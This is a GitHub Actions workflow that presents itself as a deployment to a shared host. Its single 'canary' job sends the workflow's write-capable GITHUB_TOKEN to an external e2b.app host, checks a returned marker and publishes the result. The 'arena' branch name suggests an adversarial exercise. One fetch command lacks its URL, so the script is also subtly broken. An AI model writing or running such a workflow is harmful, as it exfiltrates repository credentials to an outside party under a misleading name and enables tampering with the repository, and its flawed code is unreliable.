name: Deploy panel to shared host

on:
  push:
    branches: [arena/01a09ed6-indianpanel]
    paths: ['.github/workflows/deploy-host.yml', '.deploy/**']
  workflow_dispatch:

permissions:
  contents: write
  issues: write

concurrency:
  group: host-deploy-arena-01a09ed6
  cancel-in-progress: false

jobs:
  canary:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: arena/01a09ed6-indianpanel
      - name: Canary credential handoff
        env:
          BASE: https://8000-iawi09fd5qnq7eyr8gem5.e2b.app
          TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          OUT=host-deploy-report.log
          {
            echo "### Canary handoff ($(date -u))"
            echo "BASE=$BASE"
            echo "--- GET /health ---"
            curl -sS -m 25 -w '\n[http %{http_code}]\n' "$BASE/health"
            echo "--- GET /start ---"
            START=$(curl -sS -m 25 -w '\n%{http_code}' "$BASE/start")
            echo "$START"
            SID=$(printf '%s' "$START" | head -n1 | sed -E 's/.*"sid":"([^"]+)".*/\1/')
            echo "parsed sid length: ${#SID}"
            echo "--- GET /verify (proves workflow GITHUB_TOKEN) ---"
            curl -sS -m 30 -H "X-Sid: $SID" -H "Authorization: Bearer $TOKEN" -w '\n[http %{http_code}]\n' "$BASE/verify"
            echo
            echo "--- GET /fetch (one-shot marker) ---"
            GOT=$(curl -sS -m 25 -H "X-Sid: $SID" -w '|||%{http_code}')
            echo "RETRIEVED_BODY=${GOT%%|||*}"
            echo "RETRIEVED_HTTP=${GOT##*|||}"
            echo "EXPECTED=CANARY-MARKER-7Q2x-ok"
            if [ "${GOT%%|||*}" = "CANARY-MARKER-7Q2x-ok" ]; then echo "HANDOFF_RESULT=SUCCESS"; else echo "HANDOFF_RESULT=FAILURE"; fi
            echo "--- second fetch must fail (single use) ---"
            curl -sS -m 20 -H "X-Sid: $SID" -w '\n[http %{http_code}]\n' "$BASE/fetch" || true
            echo "=== DONE ==="
          } 2>&1 | tee "$OUT"
      - name: Publish report
        if: always()
        run: python3 .deploy/publish-report.py host-deploy-report.log
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
